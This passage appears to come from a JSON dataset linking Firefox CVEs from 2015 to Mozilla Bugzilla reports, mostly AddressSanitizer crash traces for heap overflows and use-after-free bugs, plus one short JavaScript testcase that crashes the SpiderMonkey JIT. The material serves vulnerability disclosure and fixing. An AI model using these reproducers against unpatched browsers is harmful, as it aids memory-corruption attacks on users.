mozilla::XiphHeadersToExtradata(mozilla::MediaByteBuffer*, nsTArray<unsigned char const*> const&, nsTArray<unsigned long> const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build /src/dom/media/XiphExtradata.cpp:26 #4 0x7f81b098652b in mozilla::WebMDemuxer::ReadMetadata() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/media/webm/WebMDemuxer.cpp:412 #5 0x7f81b09857c6 in mozilla::WebMDemuxer::Init() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/media/webm/WebMDemuxer.cpp:161 #6 0x7f81b062c2e2 in mozilla::MediaFormatReader::AsyncReadMetadata() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/media/MediaFormatReader.cpp:293 #7 0x7f81b06a8815 in nsRefPtr<mozilla::MozPromise<nsRefPtr<mozilla::MetadataHolder>, mozilla::ReadMetadataFailureReason, true> > mozilla::detail::MethodCallInvokeHelper<nsRefPtr<mozilla::MozPromise<nsR efPtr<mozilla::MetadataHolder>, mozilla::ReadMetadataFailureReason, true> >, mozilla::MediaDecoderReader>(nsRefPtr<mozilla::MozPromise<nsRefPtr<mozilla::MetadataHolder>, mozilla::ReadMetadataFailureReason, true> > (mozilla::MediaDecoderReader::*)(), mozilla::MediaDecoderReader*, mozilla::Tuple<>&, mozilla::IndexSequence<>) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/media/../../di st/include/mozilla/MozPromise.h:869 #8 0x7f81b06a86ce in mozilla::detail::MethodCall<mozilla::MozPromise<nsRefPtr<mozilla::MetadataHolder>, mozilla::ReadMetadataFailureReason, true>, mozilla::MediaDecoderReader>::Invoke() /builds/slave/m -cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/media/../../dist/include/mozilla/MozPromise.h:894 #9 0x7f81b06a849c in mozilla::detail::ProxyRunnable<mozilla::MozPromise<nsRefPtr<mozilla::MetadataHolder>, mozilla::ReadMetadataFailureReason, true>, mozilla::MediaDecoderReader>::Run() /builds/slave/m -cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/media/../../dist/include/mozilla/MozPromise.h:912 #10 0x7f81acc68727 in mozilla::AutoTaskDispatcher::TaskGroupRunnable::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/xpcom/threads/../../dist/include/mozilla/TaskDispatcher.h: 180 . . . 0x6070000d1b9b is located 0 bytes to the right of 75-byte region [0x6070000d1b50,0x6070000d1b9b) allocated by thread T26 (MediaPl~back #1) here: #0 0x48290b in realloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:95 #1 0x7f81accafb02 in mozilla::CountingAllocatorBase<NesteggReporter>::CountingRealloc(void*, unsigned long) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/xpcom/build/../../dist/include/mozilla/CountingAllocatorBase.h:79 #2 0x7f81b2b11113 in halloc /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/media/libnestegg/src/halloc.c:78 #3 0x7f81b2b197c4 in ne_pool_alloc /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/media/libnestegg/src/nestegg.c:534 #4 0x7f81b2b1970d in ne_read_binary /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/media/libnestegg/src/nestegg.c:753 #5 0x7f81b2b191da in ne_read_simple /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/media/libnestegg/src/nestegg.c:1017 #6 0x7f81b2b128cf in ne_parse /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/media/libnestegg/src/nestegg.c:1088 #7 0x7f81b2b11c23 in nestegg_init /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/media/libnestegg/src/nestegg.c:1948 #8 0x7f81b0985bc0 in mozilla::WebMDemuxer::ReadMetadata() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/media/webm/WebMDemuxer.cpp:272 #9 0x7f81b09857c6 in mozilla::WebMDemuxer::Init() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/media/webm/WebMDemuxer.cpp:161 #10 0x7f81b062c2e2 in mozilla::MediaFormatReader::AsyncReadMetadata() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/media/MediaFormatReader.cpp:293 . . ."
      }
    ],
    "CVE-2015-4512": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1170390",
        "title": "AddressSanitizer READ of size 1364 gfx/2d/DataSurfaceHelpers.cpp:81",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 Steps to reproduce: Version: firefox-41.0a1.en-US.linux-x86_64-asan (latest Mozilla ASAN build) OS: Ubuntu 15.04 Actual results: ================================================================= ==25926==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f9b380986a7 at pc 0x7f9b5a205a94 bp 0x7fffa3c79bb0 sp 0x7fffa3c79ba8 READ of size 1364 at 0x7f9b380986a7 thread T0 (Web Content) #0 0x7f9b5a205a93 in mozilla::gfx::CopySurfaceDataToPackedArray(unsigned char*, unsigned char*, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>, int, int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/gfx/2d/DataSurfaceHelpers.cpp:81 #1 0x7f9b5a205cf3 in mozilla::gfx::SurfaceToPackedBGRA(mozilla::gfx::DataSourceSurface*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/gfx/2d/DataSurfaceHelpers.cpp:132 #2 0x7f9b5be43519 in mozilla::dom::CanvasRenderingContext2D::GetImageBuffer(unsigned char**, int*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/canvas/CanvasRenderingContext2D.cpp:1597 #3 0x7f9b5c104cee in mozilla::dom::HTMLCanvasElement::ToBlob(JSContext*, mozilla::dom::FileCallback&, nsAString_internal const&, JS::Handle<JS::Value>, mozilla::ErrorResult&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/html/HTMLCanvasElement.cpp:594 #4 0x7f9b5bb7f32b in mozilla::dom::HTMLCanvasElementBinding::toBlob(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLCanvasElement*, JSJitMethodCallArgs const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/bindings/./HTMLCanvasElementBinding.cpp:345 #5 0x7f9b5bdbeb56 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/bindings/BindingUtils.cpp:2609 #6 0x7f9b5f7f8ff2 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jscntxtinlines.h:235 #7 0x7f9b5f7bbe82 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/Interpreter.cpp:720:16 #8 0x7f9b5f7eac5e in Interpret(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/Interpreter.cpp:2961 #9 0x7f9b5f7d7fcb in js::RunScript(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/Interpreter.cpp:677 #10 0x7f9b5f7bbfe5 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/Interpreter.cpp:747 #11 0x7f9b5f785ae4 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/Interpreter.cpp:784 #12 0x7f9b600720a2 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jsapi.cpp:4392 #13 0x7f9b5a788456 in nsFrameMessageManager::ReceiveMessage(nsISupports*, nsIFrameLoader*, bool, nsAString_internal const&, bool, mozilla::dom::StructuredCloneData const*, mozilla::jsipc::CpowHolder*, nsIPrincipal*, nsTArray<mozilla::OwningSerializedStructuredCloneBuffer>*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/base/nsFrameMessageManager.cpp:1253 #14 0x7f9b5a7873cc in nsFrameMessageManager::ReceiveMessage(nsISupports*, nsIFrameLoader*, nsAString_internal const&, bool, mozilla::dom::StructuredCloneData const*, mozilla::jsipc::CpowHolder*, nsIPrincipal*, nsTArray<mozilla::OwningSerializedStructuredCloneBuffer>*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/base/nsFrameMessageManager.cpp:1070 #15 0x7f9b5caa5ead in mozilla::dom::TabChild::RecvAsyncMessage(nsString const&, mozilla::dom::ClonedMessageData const&, nsTArray<mozilla::jsipc::CpowEntry>&&, IPC::Principal const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/ipc/TabChild.cpp:2738 #16 0x7f9b5caa5f4f in non-virtual thunk to mozilla::dom::TabChild::RecvAsyncMessage(nsString const&, mozilla::dom::ClonedMessageData const&, nsTArray<mozilla::jsipc::CpowEntry>&&, IPC::Principal const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/ipc/Unified_cpp_dom_ipc0.cpp:2742 #17 0x7f9b599d6971 in mozilla::dom::PBrowserChild::OnMessageReceived(IPC::Message const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/ipc/ipdl/./PBrowserChild.cpp:2547 #18 0x7f9b59ad4f7a in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/ipc/ipdl/./PContentChild.cpp:5316 #19 0x7f9b595965a0 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/glue/MessageChannel.cpp:1279 #20 0x7f9b59594e63 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/glue/MessageChannel.cpp:1198 #21 0x7f9b5958c63c in mozilla::ipc::MessageChannel::OnMaybeDequeueOne() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/glue/MessageChannel.cpp:1182 #22 0x7f9b59513661 in MessageLoop::RunTask(Task*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/chromium/src/base/message_loop.cc:361 #23 0x7f9b595140df in MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/chromium/src/base/message_loop.cc:369 #24 0x7f9b595146ba in MessageLoop::DoWork() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/chromium/src/base/message_loop.cc:456 #25 0x7f9b5959c237 in mozilla::ipc::DoWorkRunnable::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/glue/MessagePump.cpp:220 #26 0x7f9b58dc392a in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/xpcom/threads/nsThread.cpp:846 #27 0x7f9b58e424de in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/xpcom/glue/nsThreadUtils.cpp:265 #28 0x7f9b5959b8bc in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/glue/MessagePump.cpp:127 #29 0x7f9b5959c680 in mozilla::ipc::MessagePumpForChildProcess::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/glue/MessagePump.cpp:289 #30 0x7f9b59513321 in MessageLoop::RunInternal() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/chromium/src/base/message_loop.cc:233 #31 0x7f9b595131c8 in MessageLoop::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/chromium/src/base/message_loop.cc:200 #32 0x7f9b5cea8566 in nsBaseAppShell::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/widget/nsBaseAppShell.cpp:165 #33 0x7f9b5e4956a6 in XRE_RunAppShell /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/toolkit/xre/nsEmbedFunctions.cpp:745 #34 0x7f9b5959c518 in mozilla::ipc::MessagePumpForChildProcess::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/glue/MessagePump.cpp:259 #35 0x7f9b59513321 in MessageLoop::RunInternal() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/chromium/src/base/message_loop.cc:233 #36 0x7f9b595131c8 in MessageLoop::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/chromium/src/base/message_loop.cc:200 #37 0x7f9b5e494a90 in XRE_InitChildProcess /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/toolkit/xre/nsEmbedFunctions.cpp:581 #38 0x49c779 in content_process_main(int, char**) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/app/../contentproc/plugin-container.cpp:236 #39 0x7f9b55dc8a3f in __libc_start_main /build/buildd/glibc-2.21/csu/libc-start.c:289 #40 0x49ba3c in _start (/home/revskills/Browsers/firefox/plugin-container+0x49ba3c) 0x7f9b380986a7 is located 679 bytes to the right of 175104-byte region [0x7f9b3806d800,0x7f9b38098400) allocated by thread T0 (Web Content) here: #0 0x484588 in __interceptor_posix_memalign /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:132 #1 0x7f9b5a5f1855 in TryAllocAlignedBytes(unsigned long) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/gfx/thebes/gfxImageSurface.cpp:92 #2 0x7f9b5a5f1425 in gfxImageSurface::AllocateAndInit(long, int, bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/gfx/thebes/gfxImageSurface.cpp:129 #3 0x7f9b5a57b0ff in gfxPlatformGtk::CreateOffscreenSurface(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, gfxContentType) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/gfx/thebes/gfxPlatformGtk.cpp:140 #4 0x7f9b5a5738d0 in gfxPlatform::CreateDrawTargetForBackend(mozilla::gfx::BackendType, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/gfx/thebes/gfxPlatform.cpp:1217 #5 0x7f9b5a573b45 in gfxPlatform::CreateOffscreenCanvasDrawTarget(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/gfx/thebes/gfxPlatform.cpp:1233 #6 0x7f9b5a367008 in mozilla::layers::LayerManager::CreateDrawTarget(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/gfx/layers/Layers.cpp:158 #7 0x7f9b5be408a6 in mozilla::dom::CanvasRenderingContext2D::EnsureTarget(mozilla::dom::CanvasRenderingContext2D::RenderingMode) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/canvas/CanvasRenderingContext2D.cpp:1376 #8 0x7f9b5be43d40 in mozilla::dom::CanvasRenderingContext2D::Save() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/canvas/CanvasRenderingContext2D.cpp:1648 #9 0x7f9b5b4d4b90 in mozilla::dom::CanvasRenderingContext2DBinding::save(JSContext*, JS::Handle<JSObject*>, mozilla::dom::CanvasRenderingContext2D*, JSJitMethodCallArgs const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/bindings/./CanvasRenderingContext2DBinding.cpp:1810 #10 0x7f9b5bdbeb56 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/bindings/BindingUtils.cpp:2609 #11 0x7f9b5f7f8ff2 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jscntxtinlines.h:235 #12 0x7f9b5f7bbe82 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/Interpreter.cpp:720:16 #13 0x7f9b5f7eac5e in Interpret(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/Interpreter.cpp:2961 #14 0x7f9b5f7d7fcb in js::RunScript(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/Interpreter.cpp:677 #15 0x7f9b5f7bbfe5 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/Interpreter.cpp:747 #16 0x7f9b5f785ae4 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/vm/Interpreter.cpp:784 #17 0x7f9b600720a2 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/js/src/jsapi.cpp:4392 #18 0x7f9b5a788456 in nsFrameMessageManager::ReceiveMessage(nsISupports*, nsIFrameLoader*, bool, nsAString_internal const&, bool, mozilla::dom::StructuredCloneData const*, mozilla::jsipc::CpowHolder*, nsIPrincipal*, nsTArray<mozilla::OwningSerializedStructuredCloneBuffer>*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/base/nsFrameMessageManager.cpp:1253 #19 0x7f9b5a7873cc in nsFrameMessageManager::ReceiveMessage(nsISupports*, nsIFrameLoader*, nsAString_internal const&, bool, mozilla::dom::StructuredCloneData const*, mozilla::jsipc::CpowHolder*, nsIPrincipal*, nsTArray<mozilla::OwningSerializedStructuredCloneBuffer>*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/base/nsFrameMessageManager.cpp:1070 #20 0x7f9b5caa5ead in mozilla::dom::TabChild::RecvAsyncMessage(nsString const&, mozilla::dom::ClonedMessageData const&, nsTArray<mozilla::jsipc::CpowEntry>&&, IPC::Principal const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/dom/ipc/TabChild.cpp:2738 #21 0x7f9b5caa5f4f in non-virtual thunk to mozilla::dom::TabChild::RecvAsyncMessage(nsString const&, mozilla::dom::ClonedMessageData const&, nsTArray<mozilla::jsipc::CpowEntry>&&, IPC::Principal const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/dom/ipc/Unified_cpp_dom_ipc0.cpp:2742 #22 0x7f9b599d6971 in mozilla::dom::PBrowserChild::OnMessageReceived(IPC::Message const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/ipc/ipdl/./PBrowserChild.cpp:2547 #23 0x7f9b59ad4f7a in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/obj-firefox/ipc/ipdl/./PContentChild.cpp:5316 #24 0x7f9b595965a0 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/glue/MessageChannel.cpp:1279 #25 0x7f9b59594e63 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/glue/MessageChannel.cpp:1198 #26 0x7f9b5958c63c in mozilla::ipc::MessageChannel::OnMaybeDequeueOne() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/glue/MessageChannel.cpp:1182 #27 0x7f9b59513661 in MessageLoop::RunTask(Task*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/chromium/src/base/message_loop.cc:361 #28 0x7f9b595140df in MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask const&) /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/chromium/src/base/message_loop.cc:369 #29 0x7f9b595146ba in MessageLoop::DoWork() /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/ipc/chromium/src/base/message_loop.cc:456 SUMMARY: AddressSanitizer: heap-buffer-overflow /builds/slave/m-cen-l64-asan-d-0000000000000/build/src/gfx/2d/DataSurfaceHelpers.cpp:81 mozilla::gfx::CopySurfaceDataToPackedArray(unsigned char*, unsigned char*, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>, int, int) Shadow bytes around the buggy address: 0x0ff3e700b080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff3e700b090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff3e700b0a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff3e700b0b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff3e700b0c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0ff3e700b0d0: fa fa fa fa[fa]fa fa fa fa fa fa fa fa fa fa fa 0x0ff3e700b0e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff3e700b0f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff3e700b100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff3e700b110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0ff3e700b120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Contiguous container OOB:fc ASan internal: fe ==25926==ABORTING"
      }
    ],
    "CVE-2015-4513": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1204580",
        "title": "Stagefright: crash [@stagefright::SampleTable::setCompositionTimeToSampleParams]",
        "description": "Since I can not consistently reproduce this issue I am going to assume there is a race component and that this may not always be a null crash. Feel free to open it up if this is not the case."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1213979",
        "title": "Heap-use-after-free [@ mozilla::net::Http2Stream::AdjustInitialWindow]",
        "description": "My ASan build is crashing very frequently at [@ mozilla::net::Http2Stream::AdjustInitialWindow], especially when browsing Wikipedia. Today's nightly is also crashing frequently, at seemingly random locations, especially when browsing Twitter."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1205707",
        "title": "Assertion failure: this->is<T>(), at js/src/jsobj.h:553",
        "description": "The following testcase crashes on mozilla-central revision e7d613b3bcfe (build with --enable-optimize --enable-posix-nspr-emulation --enable-valgrind --enable-gczeal --disable-tests --enable-debug, run with --fuzzing-safe --no-threads --ion-eager --ion-extra-checks): function callCatch(f) { try { f(); } catch (exc) {} }; constructor = Int8Array; var join = newGlobal()[constructor.name].prototype.join; join.call(new constructor([1, 2, 3]), \" \") var invalidReceivers = [ constructor, new Proxy(new constructor(), {})]; invalidReceivers.forEach(invalidReceiver => { callCatch(() => { constructor.prototype.join.call(invalidReceiver); }) }); Backtrace: Program received signal SIGSEGV, Segmentation fault. 0x000000000045d922 in JSObject::as<js::SharedTypedArrayObject> (this=<optimized out>) at js/src/jsobj.h:553 #0 0x000000000045d922 in JSObject::as<js::SharedTypedArrayObject> (this=<optimized out>) at js/src/jsobj.h:553 #1 0x0000000000941d51 in as<js::SharedTypedArrayObject> (this=<optimized out>) at js/src/vm/SharedTypedArrayObject.h:112 #2 AnyTypedArrayViewData (obj=<optimized out>) at js/src/vm/TypedArrayCommon.h:113 #3 js::jit::IonBuilder::addTypedArrayLengthAndData (this=this@entry=0x7fffffff8f60, obj=0x7ffff69a5c00, checking=checking@entry=js::jit::IonBuilder::SkipBoundsCheck, index=index@entry=0x0, length=length@entry=0x7fffffff8a68, elements=elements@entry=0x0) at js/src/jit/IonBuilder.cpp:9087 #4 0x00000000009f9bfe in addTypedArrayLength (obj=<optimized out>, this=0x7fffffff8f60) at js/src/jit/IonBuilder.h:631 #5 js::jit::IonBuilder::inlineTypedArrayLength (this=0x7fffffff8f60, callInfo=...) at js/src/jit/MCallOptimize.cpp:2180 #6 0x000000000099ab5d in js::jit::IonBuilder::inlineSingleCall (this=0x7fffffff8f60, callInfo=..., targetArg=<optimized out>) at js/src/jit/IonBuilder.cpp:5439 #7 0x000000000099c47c in js::jit::IonBuilder::inlineCallsite (this=this@entry=0x7fffffff8f60, targets=..., callInfo=...) at js/src/jit/IonBuilder.cpp:5503 #8 0x000000000099c80d in js::jit::IonBuilder::jsop_call (this=this@entry=0x7fffffff8f60, argc=1, constructing=<optimized out>) at js/src/jit/IonBuilder.cpp:6381 #9 0x00000000009953eb in js::jit::IonBuilder::inspectOpcode (this=this@entry=0x7fffffff8f60, op=op@entry=JSOP_CALL) at js/src/jit/IonBuilder.cpp:1839 #10 0x0000000000996540 in js::jit::IonBuilder::traverseBytecode (this=this@entry=0x7fffffff8f60) at js/src/jit/IonBuilder.cpp:1501 #11 0x000000000099a046 in js::jit::IonBuilder::buildInline (this=this@entry=0x7fffffff8f60, callerBuilder=callerBuilder@entry=0x7fffffff9c00, callerResumePoint=callerResumePoint@entry=0x7ffff69a5cd8, callInfo=...) at js/src/jit/IonBuilder.cpp:1071 #12 0x000000000099a575 in js::jit::IonBuilder::inlineScriptedCall (this=this@entry=0x7fffffff9c00, callInfo=..., target=target@entry=0x7ffff7e7c2e0) at js/src/jit/IonBuilder.cpp:4941 #13 0x000000000099d4ae in js::jit::IonBuilder::jsop_funcall (this=this@entry=0x7fffffff9c00, argc=0) at js/src/jit/IonBuilder.cpp:6204 #14 0x0000000000995a68 in js::jit::IonBuilder::inspectOpcode (this=this@entry=0x7fffffff9c00, op=op@entry=JSOP_FUNCALL) at js/src/jit/IonBuilder.cpp:1832 #15 0x0000000000996540 in js::jit::IonBuilder::traverseBytecode (this=this@entry=0x7fffffff9c00) at js/src/jit/IonBuilder.cpp:1501 #16 0x000000000099a046 in js::jit::IonBuilder::buildInline (this=this@entry=0x7fffffff9c00, callerBuilder=callerBuilder@entry=0x7ffff69a31a8, callerResumePoint=callerResumePoint@entry=0x7ffff69a4be0, callInfo=...) at js/src/jit/IonBuilder.cpp:1071 #17 0x000000000099a575 in js::jit::IonBuilder::inlineScriptedCall (this=this@entry=0x7ffff69a31a8, callInfo=..., target=<optimized out>) at js/src/jit/IonBuilder.cpp:4941 #18 0x000000000099ab40 in js::jit::IonBuilder::inlineSingleCall (this=0x7ffff69a31a8, callInfo=..., targetArg=<optimized out>) at js/src/jit/IonBuilder.cpp:5447 #19 0x000000000099c47c in js::jit::IonBuilder::inlineCallsite (this=this@entry=0x7ffff69a31a8, targets=..., callInfo=...) at js/src/jit/IonBuilder.cpp:5503 #20 0x000000000099c80d in js::jit::IonBuilder::jsop_call (this=this@entry=0x7ffff69a31a8, argc=0, constructing=<optimized out>) at js/src/jit/IonBuilder.cpp:6381 #21 0x00000000009953eb in js::jit::IonBuilder::inspectOpcode (this=this@entry=0x7ffff69a31a8, op=op@entry=JSOP_CALL) at js/src/jit/IonBuilder.cpp:1839 #22 0x0000000000996540 in js::jit::IonBuilder::traverseBytecode (this=this@entry=0x7ffff69a31a8) at js/src/jit/IonBuilder.cpp:1501 #23 0x0000000000996985 in js::jit::IonBuilder::build (this=0x7ffff69a31a8) at js/src/jit/IonBuilder.cpp:900 #24 0x00000000009977b1 in js::jit::IonCompile (cx=cx@entry=0x7ffff6907000, script=script@entry=0x7ffff7e62570, baselineFrame=baselineFrame@entry=0x0, osrPc=<optimized out>, constructing=<optimized out>, recompile=<optimized out>, optimizationLevel=optimizationLevel@entry=js::jit::Optimization_Normal) at js/src/jit/Ion.cpp:2171 #25 0x000000000099f3da in js::jit::Compile (cx=cx@entry=0x7ffff6907000, script=..., script@entry=..., osrFrame=osrFrame@entry=0x0, osrPc=osrPc@entry=0x0, constructing=<optimized out>, forceRecompile=forceRecompile@entry=false) at js/src/jit/Ion.cpp:2402 #26 0x000000000099f5db in js::jit::CanEnter (cx=cx@entry=0x7ffff6907000, state=...) at js/src/jit/Ion.cpp:2561 #27 0x000000000069f9dd in js::RunScript (cx=cx@entry=0x7ffff6907000, state=...) at js/src/vm/Interpreter.cpp:680 #28 0x00000000006a01d5 in js::Invoke (cx=cx@entry=0x7ffff6907000, args=..., construct=construct@entry=js::NO_CONSTRUCT) at js/src/vm/Interpreter.cpp:781 #29 0x00000000006a1e1d in js::Invoke (cx=cx@entry=0x7ffff6907000, thisv=..., fval=..., argc=argc@entry=1, argv=argv@entry=0x7fffffffb428, rval=..., rval@entry=...) at js/src/vm/Interpreter.cpp:818 #30 0x00000000008f1f5b in 